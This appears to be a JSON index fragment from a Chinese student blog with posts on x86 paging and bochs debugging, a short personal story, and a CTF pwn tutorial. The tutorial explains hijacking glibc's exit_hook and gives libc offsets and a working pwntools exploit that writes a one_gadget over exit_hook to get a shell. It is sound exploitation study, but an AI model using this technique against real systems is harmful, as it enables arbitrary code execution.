conv=notrunc\n\n\n一直步进到重新设置lgdt寄存器，确认此时页表模式已经打开，cr3被设置在地址0x100000，gdt寄存器被设置好了，此时我们查看一下页表\n\n哦nice，可以看到访问3GB以上内核地址，也就是0xc0000000以上的地址时的确被引导到起始地址了\n\n访问页表到现在我们已经实现了页表结构并进入了页表模式，也通过访问虚拟地址在屏幕上打印出了“V”。但是页表是一种动态结构，在放入新内存时需要更新对应的虚拟地址映射，在返回硬盘时也要将对应的虚拟地址空间释放，我们除了通过页表的虚拟地址访问物理地址之外，也需要通过虚拟地址访问到页表本身。\n还记得之前在部署几个页目录项时将最后一个页目录项指向了页目录表的起始地址吗？\nmov [PAGE_DIR_TABLE_POS + 4092], eax\n\n这是通过虚拟地址访问页表的关键。对你没听错，页目录表指向页目录表，当通过虚拟地址访问页表时，也就是高10位全为1，此时会将页目录表当作页表使用，所以会有下面这三个奇怪的页表索引：\n\n中位为0，访问到的是页目录表的第一项，指向0x101000，中位为0xc00，指向的是内核区域，页目录表仍然指向页表的起始位置0x101000；中位全为1，页目录表的最后一项，又指回来了，页目录表的起始地址0x100000。\n因此高10位全为1时，可以通过0xfffffxxx可以访问到页目录表，xxx为页目录表中的偏移地址；或者通过高10为为0x3ff访问到页表，此时中10位是页表的下表索引而不是偏移地址，低12位是页表偏移地址\n快表TLB之前提到过页表会有设置缓存的描述位，如果G位为一就可以在快表TLB中直接取走\n\n快表也有一些属性位，RW啥的。\n快表中的缓存更新后对应的数据源也要更新，但是他不是每次一有改变就缓存刷新，也不是定时刷新，而是交给操作系统的开发人员设置。\nTLB对我们不可见，但是可以通过间接的方式更新TLB\n\n重新刷新页表基址寄存器CR3，比如将CR3数据读出来再写进去\n使用指令invlpg，这个方法可以针对TLB中的某个条目\n\nboch调试指令备忘\ntraceon|off 如果此项设为 on，每次执行一条指令，bochs 都会将反汇编的代码打印到控制台，这样在\n单步调试时免得看源码了。\n\n取消断点：d [断点编号]\n\n查看gdt寄存器：info gdt\n\nr 显示一般寄存器\n\ninfo flags|eflags 显示状态寄存器\nsreg 显示所有段寄存器的值。\ndreg 显示所有调试寄存器的值。\ncreg 显示所有控制寄存器的值。\ninfo tab 显示页表中线性地址到物理地址的映射。\npage line_addr 显示线性地址到物理地址间的映射。\n\ninfo 是个指令族，执行 help info 时可查看其所有支持的子命令，如下：\ninfo pb|pbreak|b|break 查看断点信息，等同于 blist。\ninfo CPU 显示 CPU 所有寄存器的值，包括不可见寄存器。\ninfo fpu 显示 FPU 状态。\ninfo idt 显示中断向量表 IDT。\ninfo gdt [num]显示全局描述符表 GDT，如果加了 num，只显示 gdt 中第 num 项描述符。\ninfo ldt 显示局部描述符表 LDT。\ninfo tss 显示任务状态段 TSS。\ninfo ivt [num]显示中断向量表 IVT。\n\nshow 是指令族，有很多子功能，咱们常用的就下面这 3 个。\n1．show mode \n每次 CPU 变换模式时就提示，模式是指保护模式、实模式，比如从实模式进入到保护模式时会有提示。\n2．show int \n每次有中断时就提示，同时显示三种中断类型，这三种中断类型包括“softint”、“extint”和“iret”。\n可以单独显示某类中断，如执行 show softint 只显示软件主动触发的中断，show extint 则只显示来自\n外部设备的中断，show iret 只显示 iretd 指令有关的信息。\n3．show call \n每次有函数调用发生时就会提示。\n\n\n","categories":["operating_system"],"tags":["to_do_list","operating_system"]},{"title":"奇妙冒险之一","url":"/2024/11/04/%E5%A5%87%E5%A6%99%E5%86%92%E9%99%A9%E4%B9%8B%E4%B8%80/","content":"烂账10月31日的清晨，被舍友的洗漱声吵醒。前天晚上看手机到晚上2点，但睡眠质量出奇的好，丝毫没有困意。我还想再发会呆，但有早八的数电，拖着身子下床收拾东西。\n换了班之后我每天都要核对自己的课表，同寝还有另外一个舍友和我课表重合，几乎每个有早八的上午起床后我都要问一句今天是不是要上什么课。但今天他没回答我。我看了眼手机已经50了，他坐在座位上很安逸地吃面包。\n“你不急吗？”\n没等他回答，旁边另一个室友说：\n“我们在三教都不急，你急什么。”\n数电要去二教上，三教的确比二教远得多。\n我把书拿好鞋子换上他还在吃早餐。看了一眼，我走出门。\n一大早外面却十分晴朗。时间紧，我决定不吃早餐。一边走我一边回忆昨天晚上干了什么，10点多跑了场步，回到宿舍在QQ上随便找了个同班同学问了几句作业的事之后就一直在看手机……晚上熄灯后好像还看了道题目。记忆遥远的要死，根本就想不起来考的什么。\n很快到了二教，上四楼走进教室。我刚从前门走进，立马又从后门走了出去。\n教室里一个人都不认得。\n我查了课表仔细对照了门牌，抱着忐忑重新走进教室。后面一个男生在面无表情地玩明日方舟。看清楚他在看录像之后我毫不犹豫地打断他：\n“这节课是数电吗？”\n话刚出口我就后悔了，他桌上放了本“信息”什么什么的，反正不是数字电路。\n——————————————————————————————————————————————————————\n我深知大难不死，必有后福的道理。在教室外我又在QQ上找了那个昨天晚上刚搭过话的同班同学，得知数电课取消了。抱着喜悦的心情，我回复说他真勤快。想不到有人没早八还起这么早。\n真好，被迫早起的清晨，明媚的天气，毫无困意。我想到如果我直接睡过去可能都会后悔错过了这样一个早晨。\n我决定去跑个步打个卡，再去吃早餐，回宿舍再看看昨晚那道题目。\n空腹跑步会不会对身体有害？\n问问gpt。呵呵，想不到这时候我第一个念头居然是问gpt。\n只不过我的确很好奇ai会怎么说。重新拿出手机，消息提醒弹出一个问号，是那个刚问过的同学。可能他真的觉得每天早上8点起床是很容易的事。一边想我一边走出了二教，外面阳光明媚，让人感到温暖，空气中回旋着微风的气息，少有的好天气，耳旁仿佛响起《Whirling-In-Rags, 8 AM》的旋律。我看了眼手机，瞬间觉得天旋地转。\n10点过5分。\n手机的问题，我第一时间想到。\n这时候找个路边的人问现在是不是10点了一定愚蠢无比，\n但我还是这么做了。\n是的，现在的确10点了。在二教里主观上短短几分钟实际上过去了2小时，一些时空扭曲，次元穿梭的概念闪现到我脑海中，可能我在走出二教大门时不小心踏入了另一条时间线，这条时间线比我的主宇宙快那么2小时。完蛋，我突然想起在哪里看到过一句话，不好好学习，生命中就会多出许多奇迹。\n傻瓜。当务之急是10点15确有一堂大物实验，在距离2教15分钟步程的实验楼，于是我马上狂奔起来。\n","categories":["深夜小短文， 奇妙冒险"],"tags":["深夜小短文"]},{"title":"exit函数在pwn中的利用","url":"/2024/11/07/exit%E5%87%BD%E6%95%B0%E5%9C%A8pwn%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/","content":"exit()在pwn中的利用之前听说过利用exit在什么函数上锁时覆盖one_gadget达到getshell的作用，感觉类似于IO_file但是仍然不了解。今天看到了一篇很好的文章，借此机会学习并结合例题感受一下\nexit()分析与利用-安全客 - 安全资讯平台\n前置知识析构函数面向对象语言中创建一个对象时会调用对应类的构造函数，一般用于初始化对象，可以理解为析构函数就是构造函数的对立，就是在对象销毁时自动执行，主要负责清理。比如构造函数打开了 一个文件，析构函数就要关闭这个文件。\nclass FileHandler &#123;public:    FileHandler(const char* filename) &#123;        file = fopen(filename, &quot;r&quot;);    &#125;    ~FileHandler() &#123;        if (file!= nullptr) &#123;            fclose(file);        &#125;    &#125;private:    FILE* file;&#125;;\n\n虽然c不是面向对象语言，但是在c中的exit函数中，也有具有相同思想的析构函数\n在exit()实际上就是对_run_exit_handlers()的包装，这个函数用于调用一个个析构函数，给整个程序擦辟谷。\n命名空间你可以把它想象成一个收纳盒，他把相关的变量、函数等等都装在一起，避免命名冲突。在c++中我们经常能看到using namespace std，他提供了输入输出算法等等很多功能，这就是命名空间。\n同样是个面向对象意味很重的概念，在接下来的trld_global结构体中有体现\nexit_funcs我爱读源码（哭泣\n首先exit()其实就是对_run_exit_handlers()的包装，后者里面保存了包含很多析构函数的链表，就是exit_funcs，每一个节点都有一个描述各个析构函数结构体数组fns[32]，每一个结构体数组元素才保存了一个析构函数：\nstruct exit_function&#123;long int flavor; /*   函数类型, 可以是&#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;        - ef_free表示此位置空闲       - ef_us表示此位置被使用中, 但是函数类型不知道       - ef_on, ef_at, ef_cxa 分别对应三种不同的析构函数类型, 主要是参数上的差异*/union            //多个种函数类型中只会有一个有用, 所以是联合体&#123;void (*at)(void); //ef_at类型 没有参数struct&#123; void (*fn)(int status, void *arg); void *arg;&#125; on; //ef_on类型struct&#123; void (*fn)(void *arg, int status); void *arg; void *dso_handle;&#125; cxa; //ef_cxa类型&#125; func;&#125;;\n\n而_run_exit_handlers()主要工作就是调用exit_funcs中保存的各种函数指针。\n真他娘绕。如果不是写下了以上文字我都难以弄懂\n劫持__exit_funcs链表？前文所述，__exit_func作为一个链表，每个节点都通过数组保存了描述一个个析构函数的描述（包含析构函数的各种属性说明，方便程序处理各类析构函数，同时也包含析构函数本身的指针）\n那我们能不能……劫持__exit_funcs链表？然后仿造析构函数结构体数组，再在数组里将对应的析构函数换成我们的函数执行？\n打咩。析构函数指针是经过了加密的。在操作系统中我刚刚接触了全局段描述符表，在这里就排上了用场：控制寄存器fs存储的选择子指向的是tcbhead_t结构体，析构指针的异或加密参数就是fs:30 pointer_guard，话说这看起来是不是有点眼熟……没错！fs:0x28就是我们熟悉的canary值\n如果要劫持__exit_funcs，还要泄露pointer_guard……更别提套娃接套娃的描述函数存储，一定程度上说这是不可行的。\nrtdl_fini()到rtld_global程序从start开始，start又会调用libc_start_main，而动态链接器的析构函数rtld_fini就是通过libc_start_main注册的。rtdl_fini实际指向dl_fini()函数，它位于ld.so中。当程序进行时，ld.so会通过dl_open()将所需文件映射到进程空间中，同时将所有映射文件记录在结构体_rtld_global中，当进程终止时，ld.so就通过dl_fini调用进程空间中所有模块的析构函数。\n一言以蔽之，rtld_fini通过_rtld_globle执行所有析构函数，它是通过libc_start_main注册的，globle并没有被加密，所以我们可以通过劫持其上的函数指针来任意执行。\nrtld_global结构体：\nstruct rtld_global&#123;    #define DL_NNS 16    struct link_namespaces    &#123;        //每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针        struct link_map *_ns_loaded;        /* _ns_loaded中有多少模块 */        unsigned int _ns_nloaded;        /* 映射模块的搜索表 */        struct r_scope_elem *_ns_main_searchlist;        /* This is zero at program start to signal that the global scope map is       allocated by rtld.  Later it keeps the size of the map.  It might be       reset if in _dl_close if the last global object is removed.  */        size_t _ns_global_scope_alloc;        /* 这个命名空间中的符号表, 单个命名空间中的符号不允许重复 */        struct unique_sym_table        &#123;            __rtld_lock_define_recursive(, lock) struct unique_sym            &#123;                uint32_t hashval;           //符号hash值                const char *name;           //名称                const ElfW(Sym) * sym;      //符号                const struct link_map *map; //所属模块            &#125; * entries;                   //entries可以理解为struct unique_sym数组的指针, 通过entries[idx]就可找到第idx个符号            size_t size;                   //有多少个元素            size_t n_elements;            void (*free)(void *); //析构函数        &#125; _ns_unique_sym_table;        /* 记录命名空间变化的, debug用 */        struct r_debug _ns_debug;    &#125; _dl_ns[DL_NNS]; //一个命名空间一个link_namespace结构体    /* _dl_nns表示使用了多少个命名空间: Dynamic Link Num of NameSpace */    size_t _dl_nns;    ...;&#125;接着我们分析下struct link_map, 来看看ld是怎么描述每一个模块的ELF文件都是通过节的组织的, ld自然也延续了这样的思路,l_info中的指针都指向ELF中Dyn节中的描述符, Dyn中节描述符类型是ElfW(Dyn)struct link_map&#123;   ElfW(Addr) l_addr;                /* 模块在内存中的的基地址 */   char *l_name;                     /* 模块的文件名  */   ElfW(Dyn) * l_ld;                 /* 指向ELF中的Dynamic节 */   struct link_map *l_next, *l_prev; /* 双向链表指针 */   struct link_map *l_real;   /* 这个模块所属NameSapce的idx  */   Lmid_t l_ns;   struct libname_list *l_libname;   /*       l_info是ELF节描述符组成的的数组      ELF中一个节, 使用一个ElfW(Dyn)描述      各个类型的节在l_info中的下标固定, 因此可以通过下标来区分节的类型   */   ElfW(Dyn) * l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];   const ElfW(Phdr) * l_phdr; /* ELF的头表  */   ElfW(Addr) l_entry;        /* ELF入口点  */   ElfW(Half) l_phnum;        /* 头表中有多少节  */   ElfW(Half) l_ldnum;        /* dynamic节中有多少描述符  */    ...;        &#125;ElfW(Dyn)是一个节描述符类型, 宏展开结果为Elf64_Dyn, 这个类型被定义在elf.h文件中, 与ELF中的节描述对应typedef struct&#123;Elf64_Sxword    d_tag;            /* 便签, 用于标注描述符类型 */union        &#123;  Elf64_Xword d_val;        /* 内容可以是一个值 */  Elf64_Addr d_ptr;            /* 也可以是一个指针 */&#125; d_un;&#125; Elf64_Dyn;\n\n值得一提的就是link_map中可能含有fini_array节，这个节里保存的就是该模块的析构函数，之后_dl_fini就是通过寻找fini_array调用析构函数的\n_dl_fini()函数：\nvoid internal_function _dl_fini(void)&#123;#ifdef SHARED    int do_audit = 0;again:#endif    for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns) //遍历_rtld_global中的所有非共享模块: _dl_ns[DL_NNS]    &#123;        __rtld_lock_lock_recursive(GL(dl_load_lock)); //对rtld_global上锁        unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;        /* 如果这个NameSapce没加载模块, 或者不需要释放, 就不需要做任何事, 就直接调用rtld中的函数指针释放锁 */        if (nloaded == 0 || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit)            __rtld_lock_unlock_recursive(GL(dl_load_lock));        else //否则遍历模块        &#123;            /* 把这个命名空间中的所有模块指针, 都复制到maps数组中  */            struct link_map *maps[nloaded];            unsigned int i;            struct link_map *l;            assert(nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);            for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next) //遍历链表                if (l == l-&gt;l_real)                                                /* Do not handle ld.so in secondary namespaces.  */                &#123;                    assert(i &lt; nloaded);                    maps[i] = l;                    l-&gt;l_idx = i;                    ++i;                    /* Bump l_direct_opencount of all objects so that they are not dlclose()ed from underneath us.  */                    ++l-&gt;l_direct_opencount;                &#125;            ...;            unsigned int nmaps = i;    //多少个模块            /* 对maps进行排序, 确定析构顺序 */            _dl_sort_fini(maps, nmaps, NULL, ns);            //释放锁            __rtld_lock_unlock_recursive(GL(dl_load_lock));                /* 从前往后, 析构maps中的每一个模块 */            for (i = 0; i &lt; nmaps; ++i)            &#123;                struct link_map *l = maps[i];                if (l-&gt;l_init_called)                &#123;                    /* Make sure nothing happens if we are called twice.  */                    l-&gt;l_init_called = 0;                    /* 是否包含fini_array节, 或者fini节 */                    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL || l-&gt;l_info[DT_FINI] != NULL)                    &#123;                        /* debug时打印下相关信息 */                        if (__builtin_expect(GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, 0))                            _dl_debug_printf(&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,DSO_FILENAME(l-&gt;l_name),ns);                        /* 如果有fini_array节的话 */                        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)                        &#123;                            /*                                l-&gt;l_addr: 模块l的加载基地址                                l-&gt;l_info[DT_FINI_ARRAY]: 模块l中fini_array节的描述符                                l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr: 模块l中fini_arrary节的偏移                                array: 为模块l的fini_array节的内存地址                            */                            ElfW(Addr) *array = (ElfW(Addr) *)(l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);                            /*                                 ELF中 fini_arraysz节用来记录fini_array节的大小                                l-&gt;l_info[DT_FINI_ARRAYSZ]: 模块l中fini_arraysz节描述符                                l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val: 就是fini_array节的大小, 以B为单位                                i: fini_array节的大小/一个指针大小, 即fini_array中有多少个析构函数                            */                            unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof(ElfW(Addr)));                            while (i-- &gt; 0)    //从后往前, 调用fini_array中的每一个析构函数                                ((fini_t)array[i])();                        &#125;                        /* 调用fini段中的函数 */                        if (l-&gt;l_info[DT_FINI] != NULL)                            DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);                    &#125;                    ...;                &#125;                /* Correct the previous increment.  */                --l-&gt;l_direct_opencount;            &#125;        &#125;    &#125;    ...;&#125;\n\n贴原文的上来了，难以想象何等的强大才能写就这样一篇文章啊！\nrtld_globle内有一个命名空间结构体数组，每一个命名空间内都用双向链表link_map管理了一大串模块，link_map内包含一个由elf节（比如.data .bss .text）组成的结构体数组l_info，结构体名为Elf64_Dyn，他是这样来描述节的：\ntypedef struct&#123;Elf64_Sxword    d_tag;            /* 便签, 用于标注描述符类型 */union        &#123;  Elf64_Xword d_val;        /* 内容可以是一个值 */  Elf64_Addr d_ptr;            /* 也可以是一个指针 */&#125; d_un;&#125; Elf64_Dyn;\n\n值得注意的是，在dl_fini中遍历模块的时候每个模块都会先执行一个上锁函数，这个很重要，记下来要考\nrtld_global的结构也是重量级，自上而下就是命名空间结构体数组到模块链表到节描述符\n前面说了_dl_fini就是通过rtld_global来找到各个模块的fini_array节的，接着就调用其中的析构函数指针\n归纳一下动态链接需要映射共享片段到进程空间内，动态链接器ld.so会通过dl_open()执行这一过程，同时将所有映射的文件（就是模块）记录到结构体***rtdl_global***中，他就是我们利用的关键。_rtdl_global中有一个命名空间结构体数组_link_namespaces__，每个命名空间结构体数组中有一个描述模块的结构体链表*link_map，每个节点中有一个节描述符数组*Elf64_Dyn**，从中就能找到保存析构函数指针数组的节描述符fini_array，在进程结束时ld.so会通过dl_fini()从rtdl_global开始一路找到fini_array，最终执行其中的析构函数\n然而不同于exit_funcs()，rtdl_global在遍历时没有经过加密，如果我们能修改其上的内容就可以成功劫持析构函数，执行我们自己的函数\n从理论到实践exit_hook——劫持上锁解锁函数 ||  __libc_atexit前面提到过，ld_fini在遍历模块的时候都要先”上锁“，以免和其他进程竞争\n__rtld_lock_lock_recursive(GL(dl_load_lock)); //对rtld_global上锁\n\n有意思，蠢比的是这个上锁和解锁函数指针是写在rtld_global里的……所以我们可以将其覆盖来getshell。\n这时候有人就要问了，怎么找到rtld_global呢？它是记录在ld.so里的——孩子别怕，作为mmap的文件，它的地址与libc便宜固定——我们只需要一个任意写，加上可泄露的libc基址。我愿称之为2.34后hook的遗珍——exit_hook\n\n翻了翻winmt佬的专栏，原来当年我早有见过，只不过当初才疏学浅，看得脑袋长包。现在终于理解了来龙去脉。\n\n在libc-2.23中__rtld_lock_lock_recursive &#x3D; libc_base+0x5f0040+3848\n__rtld_unlock_unlock_recursive &#x3D; libc_base+0x5f0040+3856\n在libc-2.27中\n__rtld_lock_lock_recursive &#x3D; libc_base+0x619060+3840\n__rtld_unlock_unlock_recursive &#x3D; libc_base+0x619060+3848\n\n例题：the_end\n pwn \n\n\n五个任意读写，我们直接往exit_hook上覆盖one_gadget\nfrom pwn import *from LibcSearcher3 import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)filename = &#x27;pwn&#x27;def exec_fmt(pad):    p = process(&#x27;./&#x27;+filename)    p.sendlineafter(&quot;Enter your name: &quot;, pad)    p.recvuntil(b&#x27;Hello, &#x27;)    return p.recv()&#x27;&#x27;&#x27;fmt = FmtStr(exec_fmt)print(&quot;offset ===&gt; &quot;, fmt.offset)&#x27;&#x27;&#x27;IP = &#x27;&#x27;debug = 0if debug:    p = remote(&#x27;&#x27;, 10000)else:    p = process(&#x27;./&#x27;+filename)elf = ELF(&#x27;./&#x27;+filename)def dbg():    gdb.attach(p)ubuntu16 = [&#x27;~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;, &#x27;~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;]ubuntu18 = [&#x27;~/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;, &#x27;~/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;]libc = ELF(&#x27;/home/marcel/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;)def leak(something):    rc = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))    success(something+&quot;----&gt;&quot;+hex(rc))    return rcdef leak_fmt(something):    rc = int(p.recv(14),16)    success(something+&quot;----&gt;&quot;+hex(rc))    return rcp.recvuntil(&quot;here is a gift &quot;)sleep1 = leak_fmt(&#x27;sleep&#x27;)libc_base = sleep1-libc.sym[&#x27;sleep&#x27;]success(&#x27;libc_base---&gt;&#x27;+hex(libc_base))exit_hook = libc_base +0x7f138cb83f48 -0x7f138c594000success(&#x27;exit_hook----&gt;&#x27;+hex(exit_hook))one_gadget = libc_base + 0xef9f4success(&#x27;one_gadget----&gt;&#x27;+hex(one_gadget))for i in range(5):    p.send(p64(exit_hook+i))    p.send(p8((one_gadget&gt;&gt;(i*8))&amp;0xff))p.interactive()\n\n如果实在找不到exit_hook，p &amp;_rtld_global，然后看一眼rtld_global+3840左右的位置\n关闭了标准输入，所以还要重定向一下\ncat flag&gt;&amp;0\n\n翻了winmt的文章之后发现还有一种很方便的利用方法，__run_exit_handler函数除了会调用ld_fini，还会引用一个叫做 libc_atexit 的函数指针，更棒的是这个函数在libc而不是ld中，但是他是无参调用，只能上one_gadget。\n","tags":["pwn"]}]